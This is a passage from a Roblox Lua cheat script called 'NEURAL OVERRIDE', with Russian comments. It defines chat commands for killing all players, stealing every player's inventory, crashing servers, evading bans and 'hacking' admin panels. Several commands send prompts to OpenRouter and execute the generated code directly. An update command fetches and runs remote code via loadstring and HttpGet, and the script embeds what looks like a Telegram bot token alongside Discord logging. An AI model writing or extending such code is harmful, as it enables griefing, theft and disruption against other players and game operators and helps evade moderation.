                if frame:IsA("Frame") and frame.Name ~= "Title" and frame.Name ~= "TabFrame" then
                    local title = frame:FindFirstChild("TitleLabel")
                    if not title then
                        title = Instance.new("TextLabel")
                        title.Name = "TitleLabel"
                        title.Size = UDim2.new(1, 0, 0, 25)
                        title.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
                        title.BackgroundTransparency = 0.8
                        title.BorderSizePixel = 0
                        title.Text = frame.Name or "Window"
                        title.TextColor3 = Color3.new(1, 1, 1)
                        title.TextScaled = true
                        title.Font = Enum.Font.GothamBold
                        title.Parent = frame
                        title.ZIndex = 10
                        local closeBtn = Instance.new("TextButton")
                        closeBtn.Size = UDim2.new(0, 25, 0, 25)
                        closeBtn.Position = UDim2.new(1, -30, 0, 0)
                        closeBtn.Text = "✕"
                        closeBtn.TextColor3 = Color3.new(1, 0, 0)
                        closeBtn.BackgroundTransparency = 1
                        closeBtn.Font = Enum.Font.GothamBold
                        closeBtn.TextScaled = true
                        closeBtn.Parent = title
                        closeBtn.ZIndex = 10
                        closeBtn.MouseButton1Click:Connect(function()
                            frame.Visible = not frame.Visible
                        end)
                    end
                    makeDraggable(frame, title)
                    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
                    frame.BackgroundTransparency = 0.15
                    frame.BorderSizePixel = 0
                    local corner = frame:FindFirstChild("UICorner")
                    if not corner then
                        corner = Instance.new("UICorner")
                        corner.CornerRadius = UDim.new(0, 12)
                        corner.Parent = frame
                    end
                    local shadow = frame:FindFirstChild("Shadow")
                    if not shadow then
                        shadow = Instance.new("UIStroke")
                        shadow.Color = Color3.new(0, 0, 0)
                        shadow.Thickness = 2
                        shadow.Transparency = 0.5
                        shadow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                        shadow.Parent = frame
                    end
                end
            end
        end
    end
    for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
        if gui:IsA("TextButton") then
            local bg = gui.BackgroundColor3
            gui.MouseEnter:Connect(function()
                gui.BackgroundColor3 = bg:Lerp(Color3.new(1,1,1), 0.3)
            end)
            gui.MouseLeave:Connect(function()
                gui.BackgroundColor3 = bg
            end)
            gui.MouseButton1Down:Connect(function()
                gui.BackgroundColor3 = bg:Lerp(Color3.new(0,0,0), 0.3)
                task.wait(0.1)
                gui.BackgroundColor3 = bg
            end)
            local corner = gui:FindFirstChild("UICorner")
            if not corner then
                corner = Instance.new("UICorner")
                corner.CornerRadius = UDim.new(0, 8)
                corner.Parent = gui
            end
        end
    end
end

task.wait(1)
upgradeAllGUI()

local toggleAllBtn = Instance.new("TextButton")
toggleAllBtn.Size = UDim2.new(0, 40, 0, 40)
toggleAllBtn.Position = UDim2.new(0.01, 0, 0.01, 0)
toggleAllBtn.Text = "⊞"
toggleAllBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.4)
toggleAllBtn.TextColor3 = Color3.new(1,1,1)
toggleAllBtn.Font = Enum.Font.GothamBold
toggleAllBtn.TextScaled = true
toggleAllBtn.Parent = player.PlayerGui
toggleAllBtn.ZIndex = 100
local allVisible = true
toggleAllBtn.MouseButton1Click:Connect(function()
    allVisible = not allVisible
    for _, gui in ipairs(player.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Name ~= "ToggleButton" then
            gui.Enabled = allVisible
        end
    end
    toggleAllBtn.Text = allVisible and "⊞" or "⊟"
end)

-- ================================================================
--  ОБРАБОТЧИК ВСЕХ КОМАНД (чат)
-- ================================================================
player.Chatted:Connect(function(msg)
    if not msg:lower():sub(1,1) == "/" then return end
    local parts = {}
    for word in msg:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1]:lower()
    local arg = parts[2] or ""
    local arg2 = parts[3] or ""

    if cmd == "/fly" then toggleFly()
    elseif cmd == "/tp" then teleportToPlayer(arg)
    elseif cmd == "/god" then toggleGod()
    elseif cmd == "/weapon" then spawnWeapon()
    elseif cmd == "/invite" then massInvite()
    elseif cmd == "/bots" then spawnBots(tonumber(arg) or 10)
    elseif cmd == "/monster" then spawnSmartMonsters(tonumber(arg) or 10)
    elseif cmd == "/summon" then summonAllPlayers()
    elseif cmd == "/cheat" then cheatParadise()
    elseif cmd == "/killall" then killAll()
    elseif cmd == "/flyall" then flyAll()
    elseif cmd == "/hack" then hackTarget(arg)
    elseif cmd == "/ddos" then ddosTarget(arg)
    elseif cmd == "/steal" then stealData(arg)
    elseif cmd == "/track" then trackPlayer(arg)
    elseif cmd == "/spy" then spyTarget(arg)
    elseif cmd == "/destroy" then destroyData()
    elseif cmd == "/hackmap" then hackMapMax()
    elseif cmd == "/invade" then invade()
    elseif cmd == "/global" then globalChaos()
    elseif cmd == "/portal" then createPortals(tonumber(arg) or 5)
    elseif cmd == "/aim" then toggleAimbot()
    elseif cmd == "/esp" then toggleESP()
    elseif cmd == "/antikick" then toggleAntiKick()
    elseif cmd == "/speed" then setSpeed(tonumber(arg) or 100)
    elseif cmd == "/noclip" then toggleNoClip()
    elseif cmd == "/infjump" then toggleInfiniteJump()
    elseif cmd == "/spam" then startSpamBot(arg, tonumber(arg2) or 2)
    elseif cmd == "/bright" then setFullBright()
    elseif cmd == "/invis" then toggleInvisible()
    elseif cmd == "/antiafk" then toggleAntiAFK()
    elseif cmd == "/crash" then serverCrasher()
    elseif cmd == "/dupe" then duplicateItem(arg)
    elseif cmd == "/tpall" then teleportAll()
    elseif cmd == "/silent" then toggleSilentAim()
    elseif cmd == "/mindcontrol" then mindControl(arg)
    elseif cmd == "/fakeplayer" then createFakePlayer(arg)
    elseif cmd == "/weather" then changeWeather(arg)
    elseif cmd == "/zone" then createZone()
    elseif cmd == "/build" then buildFromDescription(arg)
    elseif cmd == "/pvp" then forcePvP()
    elseif cmd == "/cursed" then cursePlayer(arg)
    elseif cmd == "/invertcontrols" then invertControls()
    elseif cmd == "/scramble" then scrambleInventory()
    elseif cmd == "/stealpet" then stealPet(arg)
    elseif cmd == "/fakeban" then fakeBan(arg)
    elseif cmd == "/musicall" then playMusicForAll(arg)
    elseif cmd == "/notify" then notifyAll(arg)
    elseif cmd == "/clonecontrol" then cloneWithControl()
    elseif cmd == "/possession" then possession()
    elseif cmd == "/timewarp" then timeWarp(tonumber(arg) or 2)
    elseif cmd == "/spawntrap" then spawnTrap()
    elseif cmd == "/megacrash" then megaCrash()
    elseif cmd == "/invertreality" then invertReality()
    elseif cmd == "/make" then makeCheat(arg)
    elseif cmd == "/stealall" then stealAllInventory()
    elseif cmd == "/army" then cloneArmy(tonumber(arg) or 50)
    elseif cmd == "/nuke" then nuke()
    elseif cmd == "/ghostassassin" then toggleAssassin()
    elseif cmd == "/autofarm" then startAutoFarm()
    elseif cmd == "/adminhack" then adminHack()
    elseif cmd == "/island" then spawnIsland()
    elseif cmd == "/chatcontrol" then chatControl(arg, arg2)
    elseif cmd == "/terminator" then toggleTerminator()
    elseif cmd == "/bypass" then bypassAllDefenses()
    elseif cmd == "/voice" then
        local text = string.sub(msg, 7)
        voiceCommand(text)
    elseif cmd == "/telegram" then
        if telegramPolling then stopTelegramPolling() else startTelegramPolling() end
    elseif cmd == "/invisibleserver" then toggleInvisibleServer()
    elseif cmd == "/city" then
        local desc = string.sub(msg, 6)
        if desc == "" then desc = nil end
        spawnCity(desc)
    elseif cmd == "/base" then spawnCity("военная база с бункерами, ангарами и вышками")
    elseif cmd == "/discord" then
        sendDiscordLog("✅ **Команда /discord выполнена**", {title = "Тест", description = "Discord интеграция работает!", color = 0x00aaff})
        print("[Discord] Тест отправлен")
    elseif cmd == "/adapt" then autoAdaptCheat()
    elseif cmd == "/shadow" then toggleShadow()
    elseif cmd == "/chatbot" then toggleChatBot()
    elseif cmd == "/autoscan" then toggleAutoScan()
    elseif cmd == "/physics" then spawnPhysicsObjects(tonumber(arg) or 100)
    elseif cmd == "/espplus" then toggleESPPlus()
    elseif cmd == "/fakeplayers" then spawnFakePlayers(tonumber(arg) or 5)
    elseif cmd == "/weather2" then fetchWeather()
    elseif cmd == "/crypto" then fetchCrypto()
    elseif cmd == "/godforall" then godForAll()
    elseif cmd == "/customcmd" then createCustomCommand(arg)
    elseif cmd == "/antibanfull" then antiBanFull()
    elseif cmd == "/dungeon" then createDungeon()
    elseif cmd == "/farm2" then toggleFarm2()
    elseif cmd == "/timescale" then setGlobalTimeScale(tonumber(arg) or 1)
    elseif cmd == "/solve" then solvePuzzle()
    elseif cmd == "/trader" then createTraderBot()
    elseif cmd == "/infoview" then toggleInfoView()
    elseif cmd == "/autobypass" then autoBypass()
    elseif cmd == "/stealthfarm" then toggleStealthFarm()
    elseif cmd == "/tornado" then tornadoMode()
    elseif cmd == "/vehicle" then spawnVehicle(arg)
    elseif cmd == "/questauto" then toggleQuestAuto()
    elseif cmd == "/autocollect" then toggleAutoCollect()
    elseif cmd == "/ai" then aiCommand(arg)
    elseif cmd == "/save" then saveScript(arg, arg2)
    elseif cmd == "/run" then runScript(arg)
    elseif cmd == "/autobot" then createAutoBot(arg)
    elseif cmd == "/buildmodel" then buildModel(arg)
    elseif cmd == "/hackall" then hackAll()
    elseif cmd == "/explore" then exploreMap()
    elseif cmd == "/learn" then learnFromPlayer()
    elseif cmd == "/update" then
        print("[NeuralOverride] Принудительное обновление...")
        loadstring(game:HttpGet(UPDATE_URL))()
    else
        aiCommand(msg)
    end
end)

-- ===== ДОПОЛНИТЕЛЬНЫЕ МЕГА-ФУНКЦИИ (NUKE, ARMY, STEAL ALL, etc.) =====
function megaCrash()
    local prompt = [[
Сгенерируй Lua-код для создания 50000 объектов в Workspace за 0.1 сек.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function invertReality()
    local prompt = [[
Сгенерируй Lua-код для инвертирования управления, цветов, гравитации.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function makeCheat(description)
    local prompt = string.format("Сгенерируй Lua-код для реализации: %s.", description)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealAllInventory()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local backpack = plr:FindFirstChild("Backpack")
            if backpack then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool.Parent = player.Backpack or player
                    end
                end
            end
            local char = plr.Character
            if char then
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool.Parent = player.Backpack or player
                    end
                end
            end
        end
    end
    print("[NeuralOverride] Все предметы украдены!")
end

function cloneArmy(count)
    count = count or 50
    for i = 1, math.min(count, 100) do
        local char = player.Character
        if not char then break end
        local clone = char:Clone()
        clone.Parent = Workspace
        clone.Name = "Clone_" .. i
        local hum = clone:FindFirstChild("Humanoid")
        if hum then
            hum.MaxHealth = 200
            hum.Health = 200
            hum.WalkSpeed = 30
            hum.JumpPower = 100
        end
        local root = clone:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(math.random(-20,20),0,math.random(-20,20))
        end
        local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
        if weaponFolder then
            local weapons = {}
            for _, v in ipairs(weaponFolder:GetChildren()) do
                if v:IsA("Tool") then table.insert(weapons, v) end
            end
            if #weapons > 0 then
                local w = weapons[math.random(1, #weapons)]:Clone()
                w.Parent = clone
            end
        end
        task.spawn(function()
            while clone.Parent do
                local nearest = nil
                local minDist = math.huge
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= player and plr.Character then
                        local r = plr.Character:FindFirstChild("HumanoidRootPart")
                        if r and root then
                            local d = (r.Position - root.Position).Magnitude
                            if d < minDist then
                                minDist = d
                                nearest = plr
                            end
                        end
                    end
                end
                if nearest and nearest.Character and root then
                    local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,2,2))
                        local targetHum = nearest.Character:FindFirstChild("Humanoid")
                        if targetHum then
                            targetHum.Health = targetHum.Health - 20
                        end
                    end
                else
                    local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                    if dir.Magnitude > 0 and root then
                        root.CFrame = root.CFrame + dir.Unit * 3
                    end
                end
                task.wait(0.5)
            end
        end)
    end
    print("[NeuralOverride] Армия клонов создана!")
end

function nuke()
    teleportAllToMe()
    task.wait(1)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local hum = plr.Character:FindFirstChild("Humanoid")
            if hum then
                hum.Health = 0
                local explosion = Instance.new("Explosion")
                explosion.Position = plr.Character.HumanoidRootPart.Position
                explosion.BlastRadius = 10
                explosion.BlastDamage = 9999
                explosion.Parent = Workspace
            end
        end
    end
    print("[NeuralOverride] Ядерный взрыв активирован!")
end

local assassinMode = false
local assassinConnection = nil
function toggleAssassin()
    assassinMode = not assassinMode
    if assassinMode then
        toggleInvisible()
        toggleNoClip()
        toggleGod()
        assassinConnection = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local targetRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        local dist = (targetRoot.Position - root.Position).Magnitude
                        if dist < 5 then
                            local hum = plr.Character:FindFirstChild("Humanoid")
                            if hum then
                                hum.Health = 0
                            end
                        end
                    end
                end
            end
        end)
        print("[NeuralOverride] Призрачный убийца включён")
    else
        if assassinConnection then assassinConnection:Disconnect() end
        assassinConnection = nil
        toggleInvisible()
        toggleNoClip()
        toggleGod()
        print("[NeuralOverride] Призрачный убийца выключен")
    end
end

local farmRunning = false
function startAutoFarm()
    farmRunning = not farmRunning
    if farmRunning then
        task.spawn(function()
            while farmRunning do
                local prompt = "Сгенерируй код для действия по фарму."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(5)
            end
        end)
        print("[NeuralOverride] Автофарм запущен")
    else
        print("[NeuralOverride] Автофарм остановлен")
    end
end

function adminHack()
    local prompt = [[
Сгенерируй Lua-код для взлома админ-панели.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spawnIsland()
    local pos = player.Character and player.Character.HumanoidRootPart.Position + Vector3.new(0,100,0) or Vector3.new(0,100,0)
    local island = Instance.new("Model")
    island.Name = "FloatingIsland"
    local base = Instance.new("Part")
    base.Size = Vector3.new(30,5,30)
    base.BrickColor = BrickColor.new("Brown")
    base.Material = Enum.Material.Slate
    base.Position = pos
    base.Anchored = true
    base.Parent = island
    local grass = Instance.new("Part")
    grass.Size = Vector3.new(28,1,28)
    grass.BrickColor = BrickColor.new("Bright green")
    grass.Material = Enum.Material.Grass
    grass.Position = pos + Vector3.new(0,3,0)
    grass.Anchored = true
    grass.Parent = island
    island.Parent = Workspace
    local tree = Instance.new("Model")
    tree.Name = "Tree"
    local trunk = Instance.new("Part")
    trunk.Size = Vector3.new(1,5,1)
    trunk.BrickColor = BrickColor.new("Brown")
    trunk.Position = pos + Vector3.new(0,5,0)
    trunk.Anchored = true
    trunk.Parent = tree
    local leaves = Instance.new("Part")
    leaves.Size = Vector3.new(5,3,5)
    leaves.BrickColor = BrickColor.new("Bright green")
    leaves.Material = Enum.Material.Foliage
    leaves.Position = pos + Vector3.new(0,8,0)
    leaves.Anchored = true
    leaves.Parent = tree
    tree.Parent = island
    print("[NeuralOverride] Летающий остров создан!")
end

function chatControl(target, message)
    local prompt = string.format("Сгенерируй код для отправки сообщения '%s' от имени %s.", message, target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ================================================================
--  ЗАПУСК АВТО-АДАПТАЦИИ, TELEGRAM, GUI
-- ================================================================

-- Авто-адаптация при старте
task.spawn(function()
    task.wait(5)
    autoAdaptCheat()
end)

-- Запуск Telegram
if TELEGRAM_BOT_TOKEN ~= "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M" then
    startTelegramPolling()
end

print("🧠 NEURAL OVERRIDE v8.1 ULTIMATE FULL EDITION ЗАГРУЖЕНА!")
print("📋 Команды: /help, /adapt, /shadow, /chatbot, /autoscan, /physics, /espplus, /fakeplayers, /weather2, /crypto, /godforall, /customcmd, /antibanfull, /dungeon, /farm2, /timescale, /solve, /trader, /infoview, /autobypass, /stealthfarm, /tornado, /vehicle, /questauto, /autocollect, и многие другие.")
print("🔄 Автообновление активно, Discord логи включены.")
print("🎨 UI улучшен: все окна перетаскиваемые, с кнопками закрытия.")
print("🔥 Адаптивный чит под карту активирован автоматически!")
